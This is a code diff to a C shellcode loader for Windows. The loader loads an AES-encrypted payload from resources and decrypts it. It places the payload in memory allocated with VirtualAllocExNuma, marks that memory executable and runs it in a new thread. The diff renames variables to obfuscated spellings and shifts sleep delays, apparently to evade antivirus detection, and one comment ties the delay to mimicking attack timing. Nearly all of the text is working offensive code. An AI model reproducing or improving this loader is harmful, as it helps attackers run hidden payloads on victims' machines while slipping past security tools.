@@ -34,16 +34,8 @@ void aedecok(char* coolcode, DWORD coolcodeLen, char* key, DWORD keyLen) {
 }
 
 
-// Function to print hex representation of the byte array
-//void PrintHex(unsigned char* data, DWORD size) {
-    //for (DWORD i = 0; i < size; i++) {
-        //printf("0x%02X ", data[i]);
-    //}
-    //printf("\n");
-//}
-
 int main() {
-    Sleep(2000);  // Sleep to mimic real-world attack time delay
+  
 
     unsigned char* AESkey;
     DWORD AESkeyLen;
@@ -54,24 +46,24 @@ int main() {
     ldres("AESCODE", &AESCode, &AESCodeLen);  // Load AES shellcode
 
     // Print the AES key and shellcode for debugging (as hex)
-     unsigned char keyy[AESkeyLen];
-    unsigned char codee[AESCodeLen];
+     unsigned char k1y[AESkeyLen];
+    unsigned char c0d1[AESCodeLen];
 
    
-    memcpy(keyy, AESkey, AESkeyLen);
-    memcpy(codee, AESCode, AESCodeLen);
+    memcpy(k1y, AESkey, AESkeyLen);
+    memcpy(c0d1, AESCode, AESCodeLen);
 
    
 
-    LPVOID memalo = VirtualAllocExNuma(GetCurrentProcess(), NULL, AESCodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);
+    LPVOID coollo = VirtualAllocExNuma(GetCurrentProcess(), NULL, AESCodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);
+    Sleep(1000);
+    aedecok((char*)c0d1, sizeof(c0d1), k1y, sizeof(k1y));  // Decrypt AES shellcode
 
-    aedecok((char*)codee, sizeof(codee), keyy, sizeof(keyy));  // Decrypt AES shellcode
-
-    memcpy(memalo, codee, sizeof(codee));  // Copy decrypted shellcode to allocated memory
+    memcpy(coollo, c0d1, sizeof(c0d1));  // Copy decrypted shellcode to allocated memory
     DWORD oldProtect;
-    VirtualProtect(memalo, sizeof(codee), PAGE_EXECUTE_READ, &oldProtect);  // Change protection to execute
+    VirtualProtect(coollo, sizeof(c0d1), PAGE_EXECUTE_READ, &oldProtect);  // Change protection to execute
 
-    HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)memalo, NULL, 0, NULL);  // Execute shellcode in a new thread
+    HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)coollo, NULL, 0, NULL);  // Execute shellcode in a new thread
     WaitForSingleObject(tHandle, INFINITE);  // Wait for thread to finish
 
     return 0;
